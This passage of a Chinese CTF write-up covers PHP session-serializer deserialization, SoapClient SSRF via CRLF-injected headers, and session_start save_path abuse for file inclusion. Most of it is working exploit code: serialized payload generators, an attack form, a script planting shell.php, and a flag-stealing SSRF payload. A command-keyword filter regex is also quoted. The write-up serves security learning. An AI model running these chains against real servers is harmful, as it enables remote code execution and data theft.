<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> $handle;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;           </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> flag();       </span><br><span class="line">    &#125;&#125;     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="keyword">public</span> $token;            </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=&amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line"></span><br><span class="line">&#125;  &#125;</span><br><span class="line"></span><br><span class="line">$li=<span class="keyword">new</span> Handle();</span><br><span class="line"><span class="keyword">echo</span> serialize($li);</span><br></pre></td></tr></table></figure>

<p>这部分代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自己以前的沙雕想法就是一个要给<code>__construct函数一个参数</code>，并且在<code>new</code>的时候传入，其实这就是一个属性问题而已，只不过二者用于修改属性的方式不太相同，我完全也可以通过如下不传参的方式进行属性修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;           </span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> flag();       </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>同样可以得到相同结果，因为属性篡改后的结果是一样的。最终效果如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZsHrTO.png" alt="ZsHrTO.png"></p>
<p>通过这波思考还是收获了很多了，更加深刻的理解了<code>&quot;属性篡改攻击&quot;</code>。</p>
<p>好了，言归正传，题目源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很简单的反序列化，查看一下<code>phpinfo</code>，发现序列化引擎用的是<code>php_serialize</code>,而本题目所设置的引擎是<code>php</code>，这就符合了我们的利用环境，php引擎直接将value部分反序列化完成攻击。首先还是给出攻击表单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> vaule=<span class="string">'|O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;'</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>反序列化脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在反序列化后的结果前面加一个竖线。最终攻击截图</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Zsb429.png" alt="Zsb429.png"></p>
<p>当时自己还思考..要不要加一个<code>PHPSESSID</code>，打的时候发现自己真的是多虑打，访问<code>index.php</code>自带<code>PHPSESSID</code>。</p>
<p>第二道题，安恒杯的一个，源码如下：</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename($_SERVER[<span class="string">'PHP_SELF'</span>])));</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;文件"</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">"存在&lt;br&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo1的析构函数&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="keyword">public</span> $obj;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">'1234567890'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo2的析构函数&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;这是foo3的析构函数&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"./class.php"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> foo1();</span><br><span class="line"></span><br><span class="line">$obj-&gt;varr = <span class="string">"phpinfo.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化<code>exp</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr;</span><br><span class="line">        <span class="keyword">public</span> $obj;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">'1234567890'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $varr=<span class="string">"phpinfo();"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> foo1();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>同样将生成的反序列化字符串前面加一个<code>|</code>，最后用表单发送一下。复现成功截图</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZsXprR.png" alt="ZsXprR.png"></p>
<h3 id="利用php原生类SoupClient中-call方法进行SSRF"><a href="#利用php原生类SoupClient中-call方法进行SSRF" class="headerlink" title="利用php原生类SoupClient中__call方法进行SSRF"></a>利用php原生类SoupClient中__call方法进行SSRF</h3><p>这个知识点是在学习一些<code>php-Session</code>安全问题的同时学到的，感觉作用很大，来记录一下。</p>
<p>这个内置类在<code>php5,php7</code>都是存在的。</p>
<h4 id="SOAP介绍"><a href="#SOAP介绍" class="headerlink" title="SOAP介绍"></a>SOAP介绍</h4><blockquote>
<p>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/07/09/Z6S8Og.png" alt="Z6S8Og.png"></p>
<p><code>SOAP</code>中最常用的也是最方便的是<code>NO-WSDL</code>模式，<code>WSDL</code>模式下使用<code>WSDL</code>文件名作为参数，并且从<code>WSDL</code>中提取服务所需信息。</p>
<p><code>NO-WSDL</code>模式下，使用参数来传递使用的信息。用法如下:</p>
<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540540393770.png" alt="enter description here"></p>
<p>注意点：</p>
<p>如果在WSDL模式下工作，则此参数是可选的。如果在非WSDL模式下工作，则必须设置<code>location和uri</code>选项，其中：</p>
<ul>
<li><strong>location</strong>是要将请求发送到的SOAP服务器的URL</li>
<li><strong>uri</strong>是SOAP服务的目标名称空间。</li>
</ul>
<p>对如下代码进行实验</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'1'</span>, <span class="string">'location'</span>=&gt;<span class="string">'http://your_vps:port'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在自己的vps监听一下</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZyoiDK.png" alt="ZyoiDK.png"></p>
<p>通过此方法即可造成<code>SSRF</code>攻击，下面是实验代码</p>
<p>local.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'hi'</span>;</span><br><span class="line">	@$a=$_POST[<span class="number">1</span>];</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/local.php'</span>;</span><br><span class="line">$post_string = <span class="string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?&gt;");'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$c=unserialize(urldecode($aaa));</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码运行的过程就是利用了</p>
<p>成功生成shell.php</p>
<p><img src="https://s2.ax1x.com/2019/07/09/ZyTzOx.png" alt="ZyTzOx.png"></p>
<p>其实<code>SoapClient</code>主要攻击点在于<code>location</code>实现的ssrf，同时去配合<code>CRLF</code>就可以控制<code>POST</code>报文，打出我们想要的内容。</p>
<h3 id="有趣的session-start-函数"><a href="#有趣的session-start-函数" class="headerlink" title="有趣的session_start()函数"></a>有趣的<code>session_start()</code>函数</h3><p>先放一道题来看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:/tmp'</span>);</span><br><span class="line">    $file = <span class="string">'function.php'</span>;</span><br><span class="line">    $func = <span class="keyword">isset</span>($_GET[<span class="string">'function'</span>])?$_GET[<span class="string">'function'</span>]:<span class="string">'filters'</span>; </span><br><span class="line">    call_user_func($func,$_GET);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_POST[<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'name'</span>]==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        header(<span class="string">'location:admin.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过思路变量覆盖将file覆盖为<code>php://filter</code>读取base64的形式,将题目源码读取出来。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filters</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/eval|assert|exec|passthru|glob|system|popen/i'</span>,$value))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Do not hack me!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hello admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'name'</span>]))&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="comment">#echo 'hello ' + $_SESSION['name'];</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you must login with admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这两个文件没有什么用，关键点还是文件包含去<code>getshell</code>。</p>
<p>我们可以通过<code>session_start</code>函数重新开始一个<code>session</code>会话,并且修改session的<code>save_path</code>,这样就可以通过包含open_basedir限制的目录来<code>getshell</code>了.payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function&#x3D;session_start&amp;save_path&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>同时POST <code>name=&lt;?php phpinfo();?&gt;</code>，在/tmp目录下生成<code>session</code>文件,最后通过文件包含加变量覆盖进行<code>getshell</code>。payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_your_PHPSESSID</span><br></pre></td></tr></table></figure>

<p><strong>通过上面的例子我们不难发现一个问题，就是<code>session_start</code>函数的一些危险作用，通过<code>session_start</code>我们可以更改session文件的储存位置，进一步来getshell，还可以改变处理序列化数据的引擎来造成反序列化漏洞甚至配合着php的soap类打出ssrf等高危操作。</strong></p>
<h4 id="LCTF的bestphp’s-revenge"><a href="#LCTF的bestphp’s-revenge" class="headerlink" title="LCTF的bestphp’s revenge"></a>LCTF的bestphp’s revenge</h4><p>题目源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先需要知道一些小知识</p>
<p><code>call_user_func</code>函数：call_user_func函数会把第一参数当作回调函数，后面的则充当为回调函数的参数。</p>
<p><strong>当第一个参数是数组时候，则把第一个值当类名，第二个当作函数方法来调用</strong>（这里也正式本题目需要用到的）</p>
<p>第二个文件<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>这里用的是<code>REMOTE_ADDR</code>去判断用户的真实IP的，所以那些伪造loaclhost的方法都是没用的，只能去思考SSRF的攻击手段，（这里就会考虑到用Soap去SSRF),但是我们并没有反序列化点如<code>unserialize</code>函数和引起<code>phar</code>反序列化的函数，但是这里有很多Session的操作，所以可以想到利用序列化引擎的不同造成反序列化，而我们正好可以通过<code>session_start</code>函数重置序列化引擎造成反序列化.</p>
<p>最终理清攻击链条：</p>
<ul>
<li>通过<code>session_start</code>函数更改序列化引擎，将我们构造好的反序列化数据传入。</li>
<li>再次访问页面，数据被成功反序列化，同时将序列化引擎更改，造成攻击，再去调用<code>SoapClient</code>类中不存在的welcome方法，触发<code>__call</code>方法，使得在非WSDL下，直接通过我们构造的<code>location</code>参数去获得<code>session</code>中的flag，回到主页面，flag被打出来。</li>
</ul>
<p>过程如下：<br>通过如下脚本生成反序列化数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$huaiqiu = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                              <span class="string">'user_agent'</span> =&gt; <span class="string">"lihuaiqiu\r\nCookie: PHPSESSID=ac8k33aggshj3eo9dqo5as6g63\r\n"</span>,<span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($huaiqiu));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>

<p>并在反序列化的数据前面加入竖线，并且通过Session_start重置序列化引擎，将反序列化数据写入Session文件。</p>
